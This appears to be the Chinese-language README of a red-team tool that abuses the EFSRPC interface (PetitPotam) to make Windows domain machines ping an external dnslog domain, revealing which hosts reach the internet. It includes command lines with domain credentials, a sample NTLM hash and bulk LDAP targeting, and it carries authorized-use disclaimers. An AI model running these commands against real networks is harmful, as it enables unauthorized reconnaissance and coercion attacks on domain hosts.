# EFSRPCrpc

在域渗透场景中，利用EFSRPC协议(PetitPotam)通过PING外网域名的方式批量探测windows出网机器

> 免责声明：此工具仅限于安全研究，用户承担因使用此工具而导致的所有法律和相关责任！作者不承担任何法律责任！

## 使用说明
* 默认通过lsarpc管道触发EFSRPC接口,可通过`-pipe`参数指定管道  {efsr,lsarpc,samr,netlogon,lsass}
* 在windows 2008和Windows 2012的环境以下，无需域内凭证；其他windows版本利用需要一个普通域内凭证

### 使用范例

```python
# 指定target
python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250  -u admin -hashes f26fb3ae03e93ab9c81667e9d738c5d9:47bf8039a8506cd67c524a03ff84ba4e -target 192.168.12.200 -dnslog test.dnslog.cn
```

```python
# 从文件中读取target
python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250  -u admin -p Aa123456  -file file.txt -dnslog test.dnslog.cn
```

```python
# 默认通过ldap查询所有域机器的DNS为target，批量PING外网dnslog域名
python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250 -u admin -p Aa123456 -dnslog test.dnslog.cn
```


## 免责声明

本工具仅面向**合法授权**的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描和攻击。**

**如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，作者将不承担任何法律及连带责任。**

在安装并使用本工具前，请您**务必审慎阅读、充分理解各条款内容**，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。


# Reference

https://github.com/fortra/impacket/tree/master      
https://github.com/XiaoliChan/PetitPotam-V2


# 安恒-星火实验室

<h1 align="center">
  <img src="img/starfile.jpeg" alt="starfile" width="200px">
  <br>
</h1>

专注于实战攻防与研究，研究涉及实战攻防、威胁情报、攻击模拟与威胁分析等，团队成员均来自行业具备多年实战攻防经验的红队、蓝队和紫队专家。本着以攻促防的核心理念，通过落地 ATT&CK 攻防全景知识库，全面构建实战化、常态化、体系化的企业安全建设与运营。

